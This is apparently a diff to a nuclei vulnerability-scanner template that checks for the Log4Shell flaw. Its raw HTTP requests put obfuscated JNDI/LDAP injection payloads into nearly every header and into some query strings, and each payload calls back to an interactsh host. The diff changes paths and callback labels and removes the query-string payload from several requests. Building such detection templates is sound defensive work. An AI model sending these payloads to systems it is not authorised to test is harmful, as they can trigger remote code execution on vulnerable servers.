@@ -15,21 +15,21 @@ info:
 requests:
   - raw:
       - |
-        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
         Accept: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accept.{{interactsh-url}}/(}
         Accept-Encoding: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.acceptencoding.{{interactsh-url}}/(}
         Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.acceptlanguage.{{interactsh-url}}/(}
 
       - |
-        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
         X-CSRF-Token: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xcsrftoken.{{interactsh-url}}/(}
         X-Druid-Comment: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xdruidcomment.{{interactsh-url}}/(}
         X-Forwarded-For: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xforwardedfor.{{interactsh-url}}/(}
 
       - |
-        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
         Referer: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.referer.{{interactsh-url}}/(}
         Upgrade-Insecure-Requests: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.upgradeinsecurerequests.{{interactsh-url}}/(}
@@ -37,7 +37,7 @@ requests:
         X-Api-Version: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xapiversion.{{interactsh-url}}/(}
 
       - |
-        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
         Authentication: Bearer ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.authenticationbearer.{{interactsh-url}}/(}
         Cookie: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.cookiename.{{interactsh-url}}/(}=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.cookievalue.{{interactsh-url}}/(}
@@ -45,60 +45,60 @@ requests:
         Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.origin.{{interactsh-url}}/(}
 
       - |
-        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
         Access-Control-Request-Headers: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accesscontrolrequestheaders.{{interactsh-url}}/(}
         Access-Control-Request-Method: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accesscontrolrequestmethod.{{interactsh-url}}/(}
         Authentication: Basic ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.authenticationbasic.{{interactsh-url}}/(}
         
       - |
-        GET /?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
         X-Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xorigin.{{interactsh-url}}/(}
         If-Modified-Since: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.ifmodifieds.{{interactsh-url}}/(}
         
       - |
-        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /api/?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
-        Accept: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accept.{{interactsh-url}}/(}
-        Accept-Encoding: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.acceptencoding.{{interactsh-url}}/(}
-        Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.acceptlanguage.{{interactsh-url}}/(}
+        Accept: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xaccept.{{interactsh-url}}/(}
+        Accept-Encoding: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xacceptencoding.{{interactsh-url}}/(}
+        Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xacceptlanguage.{{interactsh-url}}/(}
 
       - |
-        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /api/?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
-        X-CSRF-Token: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xcsrftoken.{{interactsh-url}}/(}
-        X-Druid-Comment: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xdruidcomment.{{interactsh-url}}/(}
-        X-Forwarded-For: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xforwardedfor.{{interactsh-url}}/(}
+        X-CSRF-Token: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xxcsrftoken.{{interactsh-url}}/(}
+        X-Druid-Comment: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xxdruidcomment.{{interactsh-url}}/(}
+        X-Forwarded-For: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xxforwardedfor.{{interactsh-url}}/(}
 
       - |
-        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /api/?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
-        Referer: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.referer.{{interactsh-url}}/(}
-        Upgrade-Insecure-Requests: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.upgradeinsecurerequests.{{interactsh-url}}/(}
-        User-Agent: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.useragent.{{interactsh-url}}/(}
-        X-Api-Version: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xapiversion.{{interactsh-url}}/(}
+        Referer: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xreferer.{{interactsh-url}}/(}
+        Upgrade-Insecure-Requests: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xupgradeinsecurerequests.{{interactsh-url}}/(}
+        User-Agent: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xuseragent.{{interactsh-url}}/(}
+        X-Api-Version: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xxapiversion.{{interactsh-url}}/(}
 
       - |
-        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /api/?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
-        Authentication: Bearer ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.authenticationbearer.{{interactsh-url}}/(}
-        Cookie: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.cookiename.{{interactsh-url}}/(}=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.cookievalue.{{interactsh-url}}/(}
-        Location: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.location.{{interactsh-url}}/(}
-        Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.origin.{{interactsh-url}}/(}
+        Authentication: Bearer ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xauthenticationbearer.{{interactsh-url}}/(}
+        Cookie: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xcookiename.{{interactsh-url}}/(}=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xcookievalue.{{interactsh-url}}/(}
+        Location: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xlocation.{{interactsh-url}}/(}
+        Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xorigin.{{interactsh-url}}/(}
 
       - |
-        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /api/?auth=1&res=js HTTP/1.1
         Host: {{Hostname}}
-        Access-Control-Request-Headers: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accesscontrolrequestheaders.{{interactsh-url}}/(}
-        Access-Control-Request-Method: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.accesscontrolrequestmethod.{{interactsh-url}}/(}
-        Authentication: Basic ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.authenticationbasic.{{interactsh-url}}/(}
+        Access-Control-Request-Headers: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xaccesscontrolrequestheaders.{{interactsh-url}}/(}
+        Access-Control-Request-Method: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xaccesscontrolrequestmethod.{{interactsh-url}}/(}
+        Authentication: Basic ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xauthenticationbasic.{{interactsh-url}}/(}
         
       - |
-        GET /xy4?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
+        GET /api/?auth=1&res=js&x=${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}/(} HTTP/1.1
         Host: {{Hostname}}
-        X-Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xorigin.{{interactsh-url}}/(}
-        If-Modified-Since: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.ifmodifieds.{{interactsh-url}}/(}
+        X-Origin: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xxorigin.{{interactsh-url}}/(}
+        If-Modified-Since: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.xifmodifieds.{{interactsh-url}}/(}
         
 
     matchers-condition: and
